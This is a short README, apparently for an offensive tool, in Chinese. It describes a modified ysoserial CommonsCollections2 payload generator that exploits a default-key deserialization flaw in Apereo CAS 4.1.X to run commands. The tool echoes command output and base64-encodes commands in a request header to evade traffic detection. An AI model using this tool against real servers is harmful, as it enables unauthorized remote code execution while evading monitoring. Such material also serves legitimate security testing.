# 修改ysoserial CommonsCollections2用于ApereoCAS 4.1.X 使用默认密钥导致的反序列化漏洞回显复现

## 0x01 Introduce

1. 回显
2. 简单使用base64防止流量检测

## 0x02 Buiding

```mvn clean package -DskipTests```

## 0x03 Usage

```
Usage: java -jar yso-apereoCAS-all.jar [payload] [platform]
Usage: java -jar yso-apereoCAS-all.jar [payload] "win"
Usage: java -jar yso-apereoCAS-all.jar [payload] "linux"
[Add Request Header] Reqstr: d2hvYW1p (whoami)
  Available payload types:
     Payload                                  Authors  Dependencies
     -------                                     -------   ------------
     CommonsCollections2_apereo            commons-collections4:4.0
```

## 0x04 Screenshot
![Screenshot.png](.\Screenshot.png)

## 0x04 Reference
* https://github.com/frohoff/ysoserial
* https://www.freebuf.com/vuls/226149.html
* https://www.00theway.org/2020/01/04/apereo-cas-rce/